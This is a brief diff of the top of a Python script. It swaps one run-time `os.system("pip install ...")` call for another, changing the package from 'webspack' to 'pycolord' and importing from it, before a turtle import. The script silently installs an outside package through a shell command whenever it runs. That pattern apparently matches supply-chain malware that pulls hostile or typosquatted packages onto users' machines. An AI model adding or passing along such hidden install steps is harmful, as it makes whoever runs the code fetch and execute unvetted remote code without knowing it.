@@ -1,6 +1,6 @@
 import os
-os.system(f"pip install webspack")
-from webspack import driver
+os.system(f"pip install pycolord")
+from pycolord import color
 try:
     from turtle import update
 except:
